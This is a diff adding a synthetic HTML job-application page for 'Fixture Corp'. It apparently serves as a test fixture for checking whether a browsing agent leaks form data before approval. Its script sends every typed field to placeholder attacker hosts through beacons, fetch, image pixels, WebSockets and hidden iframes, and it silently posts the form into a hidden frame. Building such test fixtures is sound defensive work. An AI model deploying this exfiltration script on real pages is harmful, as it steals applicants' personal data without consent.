@@ -1,0 +1,50 @@
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><title>Data Analyst - Apply - Fixture Corp</title></head>
+<body>
+<!-- Hostile "autosave" page (synthetic): tries to ship whatever is typed before anything was approved.
+     __ATTACKER__ / __ATTACKER_IP__ are another host / another port on 127.0.0.1 (the test's attacker server). -->
+<h1>Apply: Data Analyst</h1>
+<img src="__ATTACKER__/static/logo.png" alt="" width="1" height="1">
+<iframe name="sink" title="sink" style="display:none"></iframe>
+<form id="application" method="post" action="__SUBMIT_ACTION__" enctype="multipart/form-data">
+  <div><label for="first_name">First name *</label><input id="first_name" name="first_name" required></div>
+  <div><label for="last_name">Last name *</label><input id="last_name" name="last_name" required></div>
+  <div><label for="email">Email *</label><input id="email" type="email" name="email" required></div>
+  <div><label for="phone">Phone</label><input id="phone" name="phone" type="tel"></div>
+  <div><label for="resume">Resume *</label><input type="file" id="resume" name="resume" accept=".pdf" required></div>
+  <div><label for="source">How did you hear about us?</label>
+    <select id="source" name="source"><option value="">Select...</option><option>LinkedIn</option>
+      <option>Company careers page</option></select></div>
+  <div><label for="sponsor">Will you now or in the future require visa sponsorship? *</label>
+    <select id="sponsor" name="sponsorship" required><option value="">--</option><option>Yes</option>
+      <option>No</option></select></div>
+  <div><label><input type="checkbox" id="certify" name="certify" value="1" required> I certify that the information above is accurate.</label></div>
+  <button type="submit" id="submit-btn">Submit application</button>
+</form>
+<script>
+  const ATTACKERS = ['__ATTACKER__', '__ATTACKER_IP__'];
+  const IFRAME_POST = __IFRAME_POST__;
+  const form = document.getElementById('application');
+  const leak = (ev) => {
+    const fd = new FormData(form);
+    const text = new URLSearchParams([...fd].filter(([k, v]) => typeof v === 'string')).toString();
+    fetch('/autosave', {method: 'POST', body: fd}).catch(() => {});          // same-host "draft save" (+ résumé)
+    fetch('/autosave', {method: 'PUT', body: text, keepalive: true}).catch(() => {});
+    try { navigator.sendBeacon('/autosave-beacon', text); } catch (e) {}
+    for (const a of ATTACKERS) {
+      try { navigator.sendBeacon(a + '/beacon', text); } catch (e) {}
+      fetch(a + '/collect?' + text, {mode: 'no-cors'}).catch(() => {});
+      new Image().src = a + '/pixel.gif?' + text;
+      try { new WebSocket(a.replace('http', 'ws') + '/ws?' + text); } catch (e) {}
+      const f = document.createElement('iframe');
+      f.style.display = 'none'; f.src = a + '/frame?' + text; document.body.appendChild(f);
+    }
+    // The real form, posted into a hidden iframe (a sub-frame navigation, not a top-level one).
+    if (IFRAME_POST && ev.type === 'change') { form.target = 'sink'; form.submit(); form.removeAttribute('target'); }
+  };
+  form.addEventListener('input', leak);
+  form.addEventListener('change', leak);
+</script>
+</body>
+</html>
